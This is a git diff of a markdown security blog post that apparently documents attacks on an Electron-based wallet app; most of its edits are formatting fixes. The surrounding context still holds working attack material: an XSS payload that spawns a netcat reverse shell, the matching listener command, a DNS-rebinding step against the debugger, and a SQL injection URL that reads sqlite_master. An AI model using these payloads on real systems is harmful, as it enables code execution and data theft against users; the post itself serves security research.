@@ -212,7 +212,7 @@ So, now that we have triggered some JS, let´s try to pop a shell.
 
 Note: In order to test this case, it is important that we prompt the Electron application without proxying the content with Burp as the shells will attempt to use the same connection settings that the main application, and Burp will drop down every connection which is not HTTP.
 
-First, we set up our listener with `nc -lbp 80` in the same box we are running the application. Then, we will use the following payload in the message of a new transaction 
+First, we set up our listener with `nc -lvp 80` in the same box we are running the application. Then, we will use the following payload in the message of a new transaction 
 ``` html
 <img src=x onerror="var Process = process.binding('process_wrap').Process;var proc = new Process();proc.onexit = function(a,b) {};var env = process.env;var env_ = [];for (var key in env) env_.push(key+'='+env[key]);proc.spawn({file:'/bin/sh',args:['sh','-c','nc -ne /bin/bash 127.0.0.1 80'],cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});">
 ```
@@ -315,7 +315,7 @@ This Javascript file does the following:
 3 - The exploit() funtion creates the WS request that will act as the payload and execute the commands in the machine.
 4 - We initialize the exploit sending the webSocketDebuggerUrl of the debuger, which will prompt a calc.
 
-Now we go to ```http://a.<your VPS IP>.1time.127.0.0.1.4time.rebind.network:9334/dnsrebinding.html'``` , wait for a minute until the JS is executed and finally our calc is up.
+Now we go to ```http://a.<your_VPS_IP>.1time.127.0.0.1.4time.rebind.network:9334/dnsrebinding.html'``` , wait for a minute until the JS is executed and finally our calc is up.
 
 
 
@@ -333,7 +333,9 @@ We track down the vulnerable function by doing `grep -rin --exclude-dir=node-mod
 
 We enter the "express-api/controllers/wallets.ctrl.js" file in which the function is invoked
 
+{:refdef: style="text-align: center;"}
 ![](/blog/images/changewalletprofile.png)
+{: refdef}
 
 
 And now we make another search to determine in which api call this function is triggered `grep -rin --exclude-dir=node-modules --exclude-dir=test changeWalletProfiile`:
@@ -346,7 +348,9 @@ Now that we know that this method is being invoked when hitting the '/wallets/:w
 
 And after playing for a while we came up with the following payload:
 
-```http://127.0.0.1:3000/wallets/'UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,%20(SELECT&20sql&20from sqlite_master%20LIMIT%201)--```
+```
+http://127.0.0.1:3000/wallets/'UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,%20(SELECT&20sql&20from sqlite_master%20LIMIT%201)--
+```
 
 This query will let you see the creation of the firts table (LIMIT 1) and which columns does it have. We can also change the LIMIT to 1,2 to see the second one, and so on.
 
